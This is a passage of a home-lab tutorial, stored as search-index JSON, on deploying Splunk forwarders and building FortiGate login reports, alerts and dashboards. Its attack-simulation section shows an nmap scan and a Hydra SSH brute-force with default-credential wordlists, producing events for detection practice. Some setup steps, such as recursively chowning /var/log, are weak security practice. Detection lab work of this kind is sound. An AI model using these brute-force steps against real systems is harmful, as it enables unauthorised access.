/opt/splunkforwarder/\ncd /opt\nls -la\n</code></pre> <pre><code>#Example output\ntotal 12\ndrwxr-xr-x  3 root   root   4096 Feb 27 11:00 .\ndrwxr-xr-x 23 root   root   4096 Feb  1 03:42 ..\ndrwxr-xr-x  9 splunk splunk 4096 Feb 21 07:30 splunkforwarder\n</code></pre>"},{"location":"splunk/splunk.html#configuring-splunk-uf-on-linux","title":"Configuring Splunk UF on Linux","text":"<p>Switch to <code>splunk</code> user and start Splunk UF. When prompted, create admin credentials.</p> <pre><code>su splunk\n</code></pre> <pre><code>cd /opt/splunkforwarder/bin\n./splunk start --accept-license\n</code></pre> <p>In the <code>/opt/splunkforwarder/bin</code> directory, as the <code>splunk</code> user, run the following command to connect to Linux client (UF) the deployment server (Splunk Enterprise). </p> <pre><code>./splunk set deploy-poll 10.0.0.100:8089\n</code></pre> <p>Verify that the deployment server's IP address in <code>deploymentclient.conf</code> (located in <code>/opt/splunkforwarder/etc/system/local/</code>) is correct.</p> <pre><code>cat /opt/splunkforwarder/etc/system/local/deploymentclient.conf\n</code></pre> <pre><code>#Example output\n[target-broker:deploymentServer]\ntargetUri = 10.0.0.100:8089\n</code></pre> <p>Run the following command to add the forward-server as the Splunk Enterprise. We are essentially configuring UF to send logs to the listening port of Splunk Enterprise.</p> <pre><code>./splunk add forward-server 10.0.0.100:9997\n</code></pre> <p>Verify that the tcpout server\u2019s IP address in <code>outputs.conf</code> (located in <code>/opt/splunkforwarder/etc/system/local</code>) is correct.</p> <pre><code>cat /opt/splunkforwarder/etc/system/local/outputs.conf\n</code></pre> <pre><code>#Example output\n[tcpout]\ndefaultGroup = default-autolb-group\n\n[tcpout:default-autolb-group]\nserver = 10.0.0.100:9997\n\n[tcpout-server://10.0.0.100:9997]\n</code></pre> <p>Restart Splunk Forwarder for changes to take effect.</p> <pre><code>./splunk restart\n</code></pre>"},{"location":"splunk/splunk.html#verifying-agent-connection-on-linux","title":"Verifying Agent Connection on Linux","text":"<p>On web UI of Splunk Enterprise, go to settings, forwarder management. We should be able to see our Linux client (UF). If Linux client doesn\u2019t appear, try refreshing the web browser or restart Splunk Enterprise.</p> <p></p> <p></p>"},{"location":"splunk/splunk.html#installing-splunk-apps","title":"Installing Splunk Apps","text":"<p>Earlier, we downloaded the following Splunk Apps (tar archive files)</p> <ul> <li>Splunk Add-on for MS Windows</li> <li>Splunk Add-on for Sysmon</li> <li>Fortinet FortiGate Add-on for Splunk (optional: required if ingesting FortiGate logs through this app)</li> <li>Splunk Add-on for Unix and Linux</li> </ul> <p></p> <p>Install the add-ons (apps) on Splunk Enterprise web UI. Go to Apps &gt; Manage Apps &gt; Install app from file &gt; Upload the tar archive files. Check Upgrade app. </p> <p></p> <p></p> <p></p> <p></p> <p>If prompted to set up the apps, click set up later.</p> <p></p> <p>On terminal of the Splunk VM where Splunk Enterprise is installed, verify that there are Windows, Sysmon, Linux and FortiGate Apps in the <code>/opt/splunk/etc/apps</code> directory. Copy the apps to <code>/opt/splunk/etc/deployment-apps</code> directory.</p> <pre><code>cd /opt/splunk/etc/apps\ncp -r Splunk_TA_* /opt/splunk/etc/deployment-apps/\n</code></pre> <p>Verify that the apps are shown in the Splunk Enterprise web UI. Go to Settings &gt; Forwarder Management &gt; Configurations.</p> <p></p>"},{"location":"splunk/splunk.html#creating-indexes-for-apps","title":"Creating Indexes for Apps","text":"<p>Create indexes on the web UI. Your index name must match with index name in <code>inputs.conf</code> in each app. Go to settings &gt; indexes &gt; New Index. </p> Index Name wineventlog sysmonlog unixlog (optional) Index Data Type Events Events Events Max Size of entire Index 1 GB (Default is 500 GB so adjust accordingly) 1 GB (Default is 500 GB so adjust accordingly) 1 GB (Default is 500 GB so adjust accordingly) Enable Reduction Enable (optional) Enable (optional) Enable (optional) Reduce tisdx files older than 90 days 90 days 90 days <p>Verify that indexes have been created and enabled.</p> <p></p> <p></p> <p></p>"},{"location":"splunk/splunk.html#configuring-linux-app","title":"Configuring Linux App","text":""},{"location":"splunk/splunk.html#for-splunk-uf-v940-and-above","title":"For Splunk UF v9.4.0 and above:","text":"<p>Navigate to Groups / Server Classes &gt; New server class. Add a new server class called nix and click Save.</p> <p></p> <p>Click the nix server class. Navigate to Agents &gt; Edit agent assignment.</p> <p></p> <p>Put * in Include, and filter by linux-x86_64. Click Preview and make sure you can see a tick next to the hostname of the client. Click Save.</p> <p></p> <p>Navigate to nix server class configurations &gt; Edit configurations.</p> <p></p> <p>Select Splunk_TA_nix, add to Assigned Applications, then click Save.</p> <p></p> <p>On the nix server class configurations page, click Splunk_TA_nix.</p> <p></p> <p>Click on the toggle switch for Restart Agent.</p> <p></p> <p>Navigate back to the nix server class configurations page. Verify that the Deployment Status for Linux app shows as successful. This process may take some time, so try refreshing the page periodically.</p> <p></p>"},{"location":"splunk/splunk.html#for-older-versions-of-splunk-uf","title":"For older versions of Splunk UF:","text":"<p>On the Forwarder Management page of the web UI, click Edit under Actions for Splunk_TA_nix. Select Restart Splunkd After Installation, create a New Server Class called nix, and click Save</p> <p></p> <p></p> <p>Click Add Apps and select Splunk_TA_nix. Click Save.</p> <p></p> <p>Click Add Clients. Put * in include, and filter by linux-x86_64. Click Preview and Save. </p> <p></p> <p>You should see Restart Splunkd in the After installation column. If only Enable App is shown, Edit each app and select Restart Splunkd. Verify the configuration in the Forwarder Management.</p> <p></p> <p>If the settings are not applied try reloading the deployment server.</p> <pre><code>./splunk reload deploy-server\n</code></pre>"},{"location":"splunk/splunk.html#editing-config-files-for-linux-app","title":"Editing Config Files for Linux App","text":"<p>On the Splunk VM where Splunk Enterprise is installed, change into <code>/opt/splunk/etc/deployment-apps/Splunk_TA_nix/local</code> *directory. Copy <code>app.conf</code>, <code>inputs.conf</code> and <code>props.conf</code> from <code>/opt/splunk/etc/deployment-apps/Splunk_TA_nix/default</code> *directory.</p> <pre><code>cd /opt/splunk/etc/deployment-apps/Splunk_TA_nix/local\ncp /opt/splunk/etc/deployment-apps/Splunk_TA_nix/default/app.conf .\ncp /opt/splunk/etc/deployment-apps/Splunk_TA_nix/default/inputs.conf .\ncp /opt/splunk/etc/deployment-apps/Splunk_TA_nix/default/props.conf .\n</code></pre> <p>Make the following changes to inputs.conf: </p> <pre><code>nano inputs.conf\n</code></pre> <pre><code>[default]\nindex = unixlog\n...\n[monitor:///var/log]\nwhitelist=(\\.log|log$|messages|secure|auth|mesg$|cron$|acpid$|\\.out)\nblacklist=(lastlog|anaconda\\.syslog)\ndisabled = 0\n...\n</code></pre> <p>On the Ubuntu VM where Splunk UF is installed, navigate to <code>/opt/splunkforwarder/etc/apps/Splunk_TA_nix/local</code> directory. Copy app.conf, inputs.conf and props.conf from <code>/opt/splunkforwarder/etc/apps/Splunk_TA_nix/default</code> directory.</p> <pre><code>cd /opt/splunkforwarder/etc/apps/Splunk_TA_nix/local\ncp /opt/splunkforwarder/etc/apps/Splunk_TA_nix/default/app.conf .\ncp /opt/splunkforwarder/etc/apps/Splunk_TA_nix/default/inputs.conf .\ncp /opt/splunkforwarder/etc/apps/Splunk_TA_nix/default/props.conf .\n</code></pre> <p>Edit inputs.conf (same as above). Make the following changes to inputs.conf: </p> <pre><code>nano inputs.conf\n</code></pre> <pre><code>[default]\nindex = unixlog\n...\n[monitor:///var/log]\nwhitelist=(\\.log|log$|messages|secure|auth|mesg$|cron$|acpid$|\\.out)\nblacklist=(lastlog|anaconda\\.syslog)\ndisabled = 0\n...\n</code></pre> <p>Restart Splunk Universal Forwarder.</p> <pre><code>cd /opt/splunkforwarder/bin\n./splunk restart\n</code></pre> <p>On the Ubuntu VM where Splunk UF is installed, recursively change the ownership of <code>/var/log</code> directory to <code>splunk:splunk</code> </p> <pre><code>sudo chown -R splunk:splunk /var/log\n</code></pre> <p>On the Splunk Enterprise web interface, verify that data is being indexed on unixlog.</p> <pre><code>index=\"unixlog\"\n</code></pre> <p></p> <p></p>"},{"location":"splunk/splunk.html#configuring-windows-and-sysmon-apps","title":"Configuring Windows and Sysmon Apps","text":""},{"location":"splunk/splunk.html#for-splunk-v-940-and-above","title":"For Splunk v 9.4.0 and above:","text":"<p>Navigate to Groups / Server Classes &gt; New server class. Add a new server class called win and click Save.</p> <p></p> <p>Click the win server class. Navigate to Agents &gt; Edit agent assignment.</p> <p></p> <p>Put * in Include, and filter by windows-x64. Click Preview and make sure you can see a tick next to the hostname of the client. Click Save.</p> <p></p> <p>Navigate to win server class configurations &gt; Edit configurations.</p> <p></p> <p>Add Apps and select Splunk_TA_windows and Splunk_TA_micorsoft_sysmon. Click Save.</p> <p></p> <p>On the win server class configurations page, click Splunk_TA_windows.</p> <p></p> <p>Click on the toggle switch for Restart Agent.</p> <p></p> <p>Navigate back to the win server class configurations page and repeat the same process for Splunk_TA_micorsoft_sysmon. </p> <p></p> <p>Navigate back to the win server class Configurations page. Verify that the Deployment Status for both the Windows and Sysmon apps shows as successful. This process may take some time, so try refreshing the page periodically.</p> <p></p>"},{"location":"splunk/splunk.html#for-older-versions-of-splunk","title":"For older versions of Splunk:","text":"<p>On the Forwarder Management page of the web UI, click Edit under Actions for Splunk_TA_windows. Select Restart Splunkd After Installation, add New Server Class called win, and click Save</p> <p></p> <p>Click Add Apps and select Splunk_TA_windows and Splunk_TA_micorsoft_sysmon. Click Save.</p> <p></p> <p>Click Add Clients. Put * in Include, and filter by windows-x64. Click Preview and Save.</p> <p></p> <p>You should see Restart Splunkd in the After installation column. If only Enable App is shown, Edit each app and select Restart Splunkd.</p> <p></p> <p></p> <p>Verify the configuration in the Forwarder Management.</p> <p></p> <p></p> <p>If the configuration is not applied, try reloading the deployment-server</p> <pre><code>./splunk reload deploy-server\n</code></pre> <p>Verify that <code>/opt/splunk/etc/system/local/serverclass.conf</code> aligns with our configuration so far</p> <pre><code>cat /opt/splunk/etc/system/local/serverclass.conf\n</code></pre> <pre><code>[serverClass:win:app:Splunk_TA_microsoft_sysmon]\nrestartSplunkWeb = 0\nrestartSplunkd = 1\nstateOnClient = enabled\n\n[serverClass:win:app:Splunk_TA_windows]\nrestartSplunkWeb = 0\nrestartSplunkd = 1\nstateOnClient = enabled\n\n[serverClass:win]\nmachineTypesFilter = windows-x64\nwhitelist.0 = *\n</code></pre>"},{"location":"splunk/splunk.html#editing-config-files-for-windows-app","title":"Editing Config Files for Windows App","text":"<p>On the Splunk VM where Splunk Enterprise is installed, change into <code>opt/splunk/etc/deployment-apps/Splunk_TA_windows/local</code> directory</p> <p>Copy <code>app.conf</code> *and <code>inputs.conf</code> from <code>/opt/splunk/etc/deployment-apps/Splunk_TA_windows/default</code> *directory</p> <pre><code>cd /opt/splunk/etc/deployment-apps/Splunk_TA_windows/local\ncp /opt/splunk/etc/deployment-apps/Splunk_TA_windows/default/app.conf .\ncp /opt/splunk/etc/deployment-apps/Splunk_TA_windows/default/inputs.conf .\n</code></pre> <p>Make the following changes to <code>inputs.conf</code></p> <pre><code>nano inputs.conf\n</code></pre> <pre><code>[default]\nindex = wineventlog\n\n###### OS Logs ######\n[WinEventLog://Application]\ndisabled = 0\nstart_from = oldest\ncurrent_only = 0\ncheckpointInterval = 5\nrenderXml=false \n\n[WinEventLog://Security]\ndisabled = 0\nstart_from = oldest\ncurrent_only = 0\nevt_resolve_ad_obj = 1\ncheckpointInterval = 5\nblacklist1 = EventCode=\"4662\" Message=\"Object Type:(?!\\s*groupPolicyContainer)\"\nblacklist2 = EventCode=\"566\" Message=\"Object Type:(?!\\s*groupPolicyContainer)\"\nrenderXml=false \n\n[WinEventLog://System]\ndisabled = 0\nstart_from = oldest\ncurrent_only = 0\ncheckpointInterval = 5\nrenderXml=false\n</code></pre> <p>On WS2019 host where Splunk Universal Forwarder is configured, navigate to <code>C:\\Program Files\\SplunkUniversalForwarder\\etc\\apps\\Splunk_TA_windows\\local</code> . Copy <code>app.conf</code> and <code>inputs.conf</code> from <code>C:\\Program Files\\SplunkUniversalForwarder\\etc\\apps\\Splunk_TA_windows\\default</code> . Edit <code>inputs.conf</code> (same as above). Open the Notepad or Wordpad as administrator and edit the inputs.conf file.</p> <p></p> <p>Restart Splunk Universal Forwarder. On PowerShell, change directory into <code>C:\\program files\\SplunkUniversalForwarder\\bin</code> . Run <code>./splunk restart</code></p> <pre><code>cd \"C:\\program files\\SplunkUniversalForwarder\\bin\"\n./splunk restart\n</code></pre> <pre><code>#Example output\nPS C:\\Users\\Administrator&gt; cd \"C:\\program files\\SplunkUniversalForwarder\\bin\"\nPS C:\\program files\\SplunkUniversalForwarder\\bin&gt; ./splunk restart\nSplunkForwarder: Stopped\n\nSplunk&gt; Another one.\n\nChecking prerequisites...\n        Checking mgmt port [8089]: open\n        Checking conf files for problems...\n        Done\n        Checking default conf files for edits...\n        Validating installed files against hashes from 'C:\\program files\\SplunkUniversalForwarder\\splunkforwarder-9.3.0-51ccf43db5bd-windows-64-manifest'\n        All installed files intact.\n        Done\nAll preliminary checks passed.\n\nStarting splunk server daemon (splunkd)...\n\nSplunkForwarder: Starting (pid 2328)\nDone\n</code></pre> <p>Verify that data is being forwarded on wineventlog index. On web UI, navigate to Settings &gt; Indexes and refresh the page. Go to Apps &gt; Search &amp; Reporting &gt; Search for <code>index=wineventlog</code> .</p> <pre><code>index=\"wineventlog\"\n</code></pre> <p></p> <p></p> <p>If the logs are not being indexed, try refreshing the web UI. </p>"},{"location":"splunk/splunk.html#editing-config-files-for-sysmon-app","title":"Editing Config Files for Sysmon App","text":"<p>On the Splunk VM where Splunk Enterprise is installed, change into <code>/opt/splunk/etc/deployment-apps/Splunk_TA_microsoft_sysmon/local</code> ****directory. Copy <code>app.conf</code> and <code>inputs.conf</code> from <code>/opt/splunk/etc/deployment-apps/Splunk_TA_microsoft_sysmon/default</code> directory.</p> <pre><code>cd /opt/splunk/etc/deployment-apps/Splunk_TA_microsoft_sysmon/local\ncp /opt/splunk/etc/deployment-apps/Splunk_TA_microsoft_sysmon/default/app.conf .\ncp /opt/splunk/etc/deployment-apps/Splunk_TA_microsoft_sysmon/default/inputs.conf .\n</code></pre> <p>Make the following changes to <code>inputs.conf</code> . Your index name must match with the index name you created earlier</p> <pre><code>nano inputs.conf\n</code></pre> <pre><code>[default]\nindex = sysmonlog\n\n[WinEventLog://Microsoft-Windows-Sysmon/Operational]\ndisabled = false\nrenderXml = 1\nsource = XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\n\n[WinEventLog://WEC-Sysmon]\ndisabled = true\nrenderXml = 1\nsource = XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\nsourcetype = XmlWinEventLog:WEC-Sysmon\nhost = WinEventLogForwardHost\n</code></pre> <p>On WS2019 host where Splunk Universal Forwarder is configured, navigate to </p> <p><code>C:\\Program Files\\SplunkUniversalForwarder\\etc\\apps\\Splunk_TA_microsoft_sysmon\\local</code> . Copy <code>app.conf</code> and <code>inputs.conf</code> from <code>C:\\Program Files\\SplunkUniversalForwarder\\etc\\apps\\Splunk_TA_microsoft_sysmon\\default</code> . Edit <code>inputs.conf</code> (same as above) </p> <p></p> <p>Restart Splunk Universal Forwarder. On PowerShell, change directory into <code>C:\\program files\\SplunkUniversalForwarder\\bin</code> . Run <code>./splunk restart</code> .</p> <pre><code>cd \"C:\\program files\\SplunkUniversalForwarder\\bin\"\n./splunk restart\n</code></pre> <pre><code>#Example output\nPS C:\\program files\\SplunkUniversalForwarder\\bin&gt; ./splunk restart\nSplunkForwarder: Stopped\n\nSplunk&gt; Another one.\n\nChecking prerequisites...\n        Checking mgmt port [8089]: open\n        Checking conf files for problems...\n        Done\n        Checking default conf files for edits...\n        Validating installed files against hashes from 'C:\\program files\\SplunkUniversalForwarder\\splunkforwarder-9.3.0-51ccf43db5bd-windows-64-manifest'\n        All installed files intact.\n        Done\nAll preliminary checks passed.\n\nStarting splunk server daemon (splunkd)...\n\nSplunkForwarder: Starting (pid 4824)\nDone\n\nPS C:\\program files\\SplunkUniversalForwarder\\bin&gt;\n</code></pre> <p>Verify that Sysmon logs are being indexed. </p> <p></p> <p>Search for <code>index=sysmonlog source=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational</code></p> <pre><code>index=sysmonlog source=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\n</code></pre> <p></p>"},{"location":"splunk/splunk.html#annex-installing-splunk-uf-on-windows-with-a-virtual-account","title":"Annex: Installing Splunk UF on Windows with a Virtual Account","text":"<p>Selecting Virtual Account will create a service account called <code>NT SERVICE\\SplunkForwarder</code>. For Sysmon Log Forwarding to work, <code>NT SERVCIE\\SplunkForwarder</code> must be assigned as a member of Event Log Readers group through Group Policy. If your Windows host is not joined to a domain and you have technical issues with the Virtual Account, use Local System but note that this is not best security practice. </p> <p></p> <p>Leave the values as default and click Next</p> <p></p> <p>Leave the values as default and click Next (Windows Event Logs forwarding will be configured later).</p> <p></p> <p>Create admin credentials.</p> <p></p> <p>Enter IP address of your Deployment Server (Splunk server) and port 8089.</p> <p></p> <p>Enter IP address of your Receiving Indexer (Splunk server) and port 9997.</p> <p></p> <p>Click Next and finish install. Navigate to C:\\Program Files\\SplunkUniversalForwarder. Right-click and select properties. Verify that Splunk Universal Forwarder is configured to run by virtual account SplunkForwarder.</p> <p></p> <p>Open Group Policy Management. Right click on domain name and select Create a GPO in this domain and link it here.</p> <p></p> <p>Name it as Restricted Groups.</p> <p></p> <p>Right click on Restricted Groups and click Edit.</p> <p></p> <p>Navigate to Restricted Groups and Add Group.</p> <p></p> <p>Click Browse.</p> <p></p> <p>Type event log readers and click Check Names. Make sure that the names is underlined. Click OK.</p> <p></p> <p>Add NT SERVICE\\SplunkForwarder as a member of this group. Click OK. Click Apply and OK.</p> <p></p> <p>Verify the configuration.</p> <p></p> <p>On Command Prompt as Administrator run the following command to update Group Policy:</p> <pre><code>gpupdate /force\n</code></pre> <pre><code>#Example output\nC:\\Users\\Administrator&gt;gpupdate /force\nUpdating policy...\n\nComputer Policy update has completed successfully.\nUser Policy update has completed successfully.\n</code></pre> <p>Restart Splunk UF. If Sysmon logs are not being ingested by Splunk, check Channel Access setting for Sysmon. It is likely that SplunkForwarder is not added to the Channel Access.</p> <pre><code>wevtutil gl \"Microsoft-Windows-Sysmon/Operational\"\n</code></pre> <p>Get SecurityIdentifier(sid) of SplunkForwarder by running this PowerShell script.</p> <pre><code>$user = [System.Security.Principal.NTAccount]\"NT SERVICE\\SplunkForwarder\"\n$sid = $user.Translate([System.Security.Principal.SecurityIdentifier])\nWrite-Output $sid.Value\n</code></pre> <p>Add SplunkForwarder to Channel Access by running the command below. Add your sid of SplunkForwarder</p> <pre><code>wevtutil sl \"Microsoft-Windows-Sysmon/Operational\" /ca:\"O:BAG:SYD:(A;;0x2;;;S-1-15-2-1)(A;;0x2;;;S-1-5-80-972488765-139171986-783781252-3188962990-3730692313)(A;;0xf0007;;;SY)(A;;0x7;;;BA)(A;;0x1;;;BO)(A;;0x1;;;SO)(A;;0x1;;;S-1-5-32-573)\"\n</code></pre> <p>Restart Splunk UF.</p>"},{"location":"splunk/splunk.html#introduction-to-splunk","title":"Introduction to Splunk","text":"<p>Splunk offers free training. You will need to create a user account to access free training materials. The following content is available from the free course \u201cIntroduction to Splunk.\u201d Alternatively, same contents are available from SplunkHowTo YouTube channel.</p> <p>Refer to Ingesting FortiGate Logs through SC4S and configure Syslog Logging on FortiGate on port 514. </p>"},{"location":"splunk/splunk.html#attack-simulation","title":"Attack Simulation","text":"<p>Run nmap scan against FortiGate VM\u2019s internal IP address. From the nmap scan result, we can see that port 22 for ssh is open and belongs to FortiGate. </p> <pre><code>nmap -sC -sV 10.0.0.1 -v\n</code></pre> <pre><code>#Example output\nPORT    STATE  SERVICE   VERSION\n22/tcp  open   ssh       FortiSSH (protocol 2.0)\n| ssh-hostkey: \n|   256 63:3a:d1:25:e2:97:c3:52:e8:00:77:b5:0f:db:2d:9a (ECDSA)\n|   384 41:0d:b6:d0:af:43:08:fe:5b:64:e3:de:7f:80:6c:82 (ECDSA)\n|   521 1f:ac:5e:96:a2:70:a5:ea:f2:3f:e4:12:fd:23:aa:94 (ECDSA)\n|_  256 45:77:22:18:b8:13:bb:6d:60:bf:87:91:95:f3:d9:02 (ED25519)\n113/tcp closed ident\n443/tcp open   ssl/https\n| ssl-cert: Subject: commonName=FortiGate/organizationName=Fortinet Ltd./stateOrProvinceName=California/countryName=US\n| Subject Alternative Name: IP Address:192.168.1.10, IP Address:10.0.0.1\n| Issuer: commonName=FGVMEVMBF57GNJF3/organizationName=Fortinet/stateOrProvinceName=California/countryName=US\n| Public Key type: rsa\n| Public Key bits: 2048\n| Signature Algorithm: sha256WithRSAEncryption\n| Not valid before: 2025-02-25T22:28:01\n| Not valid after:  2027-05-31T22:28:01\n| MD5:   1757:d25d:ec8e:5eae:92ef:1b01:91a6:9fb1\n|_SHA-1: 9246:9b61:fbab:1a64:aeac:da55:7ebf:277f:05e5:65ec\n&lt;SNIP&gt;\n</code></pre> <p>Create a usernames text file containing default usernames for FortiGate. Create a passwords text file containing passwords.</p> <pre><code>nano usernames.txt\n</code></pre> <pre><code>admin\nadministrator\nadm\nfortigate\n</code></pre> <pre><code>nano passwords.txt\n</code></pre> <pre><code>P@ssw0rd\npassword\npassword123\nqwerty\nadmin\n</code></pre> <p>Using the usernames and passwords text file, run Hydra to perform a brute-force attack on FortiGate's SSH service.</p> <pre><code>hydra -L usernames.txt -P passwords.txt ssh://10.0.0.1 \n</code></pre> <pre><code>#Example output\n\u2514\u2500$ hydra -L usernames.txt -P passwords.txt ssh://10.0.0.1 \n\nHydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-27 14:25:56\n[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 24 login tries (l:4/p:6), ~2 tries per task\n[DATA] attacking ssh://10.0.0.1:22/\n[22][ssh] host: 10.0.0.1   login: admin   password: admin\n[ERROR] ssh target does not support password auth\n[ERROR] ssh target does not support password auth\n[ERROR] ssh target does not support password auth\n[ERROR] ssh target does not support password auth\n[ERROR] ssh target does not support password auth\n[ERROR] ssh target does not support password auth\n[ERROR] ssh target does not support password auth\n[ERROR] ssh target does not support password auth\n[ERROR] ssh target does not support password auth\n[ERROR] ssh target does not support password auth\n[ERROR] all children were disabled due too many connection errors\n0 of 1 target successfully completed, 1 valid password found\n[INFO] Writing restore file because 2 server scans could not be completed\n[ERROR] 1 target was disabled because of too many errors\n[ERROR] 1 targets did not complete\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-27 14:25:57\n</code></pre> <p>To generate failed login events from multiple different hosts, SSH into the FortiGate using a valid username but a random password. </p> <p>From Splunk and Ubuntu VM:</p> <pre><code>ssh admin@10.0.0.1\n</code></pre> <pre><code>#Example output\nThe authenticity of host '10.0.0.1 (10.0.0.1)' can't be established.\nED25519 key fingerprint is SHA256:zuocT3kebXHrIVyokxu2EKQTKhuxG/ikAQb2K+uZY54.\nThis key is not known by any other names.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.0.0.1' (ED25519) to the list of known hosts.\nadmin@10.0.0.1's password: \nPermission denied, please try again.\nadmin@10.0.0.1's password: \nPermission denied, please try again.\nadmin@10.0.0.1's password: \nReceived disconnect from 10.0.0.1 port 22:2: Too many authentication failures\nDisconnected from 10.0.0.1 port 22\n</code></pre> <p>To generate login successful events, SSH into FortiGate using a valid credentials. You will need to wait until the connection is reset by FortiGate.</p> <p>From Splunk and Ubuntu VM:</p> <pre><code>ssh admin@10.0.0.1\n</code></pre> <pre><code>WARNING: File System Check Recommended! An unsafe reboot may have caused an inconsistency in the disk drive.\nIt is strongly recommended that you check the file system consistency before proceeding.\nPlease run 'execute disk list' and then 'execute disk scan &lt;ref#&gt;'.\nNote: The device will reboot and scan the disk during startup. This may take up to an hour.\nFGVMEVMBF57GNJF3 # exit\nConnection to 10.0.0.1 closed.\n</code></pre>"},{"location":"splunk/splunk.html#creating-reports","title":"Creating Reports","text":"<p>On Splunk Enterprise web UI, search for login failed events on FortiGate.</p> <pre><code>index=* sourcetype=\"fortigate_event\" login failed\n</code></pre> <p>Select srcip from Interesting Fields, then select Top values.</p> <p></p> <p>This will visualise data as a bar chart. Save As Report.</p> <p></p> <p>Set Title as Security_Report_Failed_SSH_Login_Attempts. Set Content as Bar Chart. Select Yes for Time Range Picker. Click Save.</p> <p></p> <p>Select View</p> <p></p> <p>Select Time Range as All time and click Reports.</p> <p></p> <p>Edit Permissions for Security_Report_Failed_SSH_Login_Attempts.</p> <p></p> <p>Select following options:</p> <ul> <li>Display For App</li> <li>Run As User</li> <li>Assign Read to Everyone</li> </ul> <p>Click Save</p> <p></p> <p>Edit Schedule (optional). Scheduling Report can reduce strain on your environment caused by repeatedly running new ad-hoc searches. Select Schedule and Time Range of your preference (leave as default). Click Save.</p> <p></p> <p></p>"},{"location":"splunk/splunk.html#creating-alerts","title":"Creating Alerts","text":"<p>On Splunk Enterprise web UI, search for Admin login failed events on FortiGate.</p> <pre><code>index=* sourcetype=\"fortigate_event\" login failed\n</code></pre> <p>Save As Alert</p> <p></p> <p>Set Title as FortiGate Login Failures. Set Permissions to Private. Set Alert type as Schedules to Run every hours and Expire after 24 hours. Set Trigger Conditions to trigger alert when Number of Results is greater than 10 and trigger Once. Select Throttle (after an alert is triggered, subsequent alerts will not be triggered until after the throttle period). Suppress trigger for 60 seconds. Set Trigger Actions to Add to Trigger Alerts with High Severity. Click Save. </p> <p></p> <p></p> <p>Click Permissions</p> <p></p> <p>Select Display For App. Assign Read access to Everyone. Click Save.</p> <p></p> <p>Select Edit Alert again</p> <p></p> <p>Change Alert type to Real-time. Suppress all fields containing field value by entering a asterisk. Click Save.</p> <p></p> <p>Click Triggered Alerts.</p> <p></p> <p>Alternatively, Triggered Alerts can be viewed on the Activity tab (Activity &gt; Triggered Alerts). If you don\u2019t see your alerts, manually trigger alerts by running Hydra on Kali VM. </p> <p></p> <p>Alerts and Reports can also be viewed from Setting &gt; Searches, reports, and alerts</p> <p></p>"},{"location":"splunk/splunk.html#creating-dashboards","title":"Creating Dashboards","text":"<p>On Splunk Enterprise web UI, search for login failed events on FortiGate.</p> <pre><code>index=* sourcetype=\"fortigate_event\" login failed\n</code></pre> <p></p> <p>From the Interesting Fields panel, Select more fields. </p> <p></p> <p>Search for user and select user_name, then close the window.</p> <p></p> <p>The selected user_name field should now appear in the selected fields. Select user_name then top values. </p> <p></p> <p>This will generate a Visualisation that is most suitable for our data.</p> <p></p> <p>Select Bar Chart and select Pie Chart.</p> <p></p> <p>Select Save As, then New Dashboard.</p> <p></p> <p>Set Dashboard Title as \u201cFortiGate Logins\u201d and leave Permissions as Private. Select Classic Dashboards (we will explore Dashboard Studio later). Set Panel Title as \u201cFailed Logins by User.\u201d Set Visualization Type as Pie Chart. Save to Dashboard. </p> <p></p> <p>View Dashboard</p> <p></p> <p></p> <p>Go back to Search and search for FortiGate login events (not login failed). </p> <pre><code>index=* sourcetype=\"fortigate_event\" login\n</code></pre> <p>In the Interesting Fields panel, select logdesc, then Top values by time</p> <p></p> <p>This shows the login trends over time as a line chart.</p> <p></p> <p>Select Format, then Legend. Select Legend Position as Left. This positions the legend to the left. </p> <p></p> <p></p> <p>Select General. Select Min/Max in Show Data Values. This shows data values on the peak of the graph.</p> <p></p> <p>Save As Existing Dashboard. Select FortiGate Logins. Save to Dashboard.</p> <p></p> <p>View Dashboard</p> <p></p> <p></p> <p>Click Edit on top right. Add Panel. Select New from Report. Select Security_Report_Failed_SSH_Login_Attempts. Select Add to Dashboard</p> <p></p> <p>Drag and Drop Bar Chart next to the Pie Chart. Edit Drilldown on the Pie Chart.</p> <p></p> <p>Set Drilldown Action On click to Link to Search. Click Apply.</p> <p></p> <p>Save the Dashboard.</p> <p></p> <p>Since we configured Link to Search, clicking 'admin' on the pie chart will redirect you to the Search and Reporting page with the search query automatically populated.</p> <p></p>"},{"location":"splunk/splunk.html#cloning-in-dashboard-studio","title":"Cloning in Dashboard Studio","text":"<p>While the FortiGate Logins Dashboard is open, select Clone in Dashboard Studio.</p> <p></p> <p>Set Title as FortiGate Logins - Dashboard Studio. Select Grid layout. Click Convert &amp; Save.</p> <p></p> <p>Click Save. If Save button is greyed out, toggle Add submit button then click Save. Click View. We have successfully cloned the dashboard in dashboard studio.</p> <p></p> <p></p>"},{"location":"splunk/splunk.html#references","title":"References","text":"<ul> <li>https://youtu.be/gNeF_mT6Eng?si=No3aBK1EDt_LuK80</li> <li>https://youtu.be/Wze0yXsMKVM?si=N6Y4iW3m5ewxD1Hv</li> <li>https://youtu.be/Iol1CHyv23A?si=ZWXFI-QOZVA8BUaa</li> <li>https://youtu.be/zFosqdAadJg?si=mn5HtZHhud3jkcPR</li> <li>https://docs.splunk.com/Documentation/Splunk/9.3.0/Installation/Whatsinthismanual</li> <li>https://community.splunk.com/t5/Getting-Data-In/Sysmon-events-not-getting-indexed/m-p/688793?lightbox-message-images-688793=31015i33DABC9A02E482CD#M114683</li> <li>https://youtu.be/1Ur3xDNaE4s?si=Dfh4-4PDkOccbnTR</li> <li>https://splunk.github.io/splunk-connect-for-syslog/main/</li> <li>https://gitlab.com/J-C-B/community-splunk-scripts/-/tree/master/</li> <li>https://youtu.be/zWkGVnsNY8M?si=9iNqCFLlktpQq6qQ</li> <li>https://youtu.be/Xepw_Xk9HX8?si=-D53cGVAs7Ckcrp6</li> <li>https://youtu.be/8jvEmAmQNug?si=tc2tzJh4uOG9I62V</li> 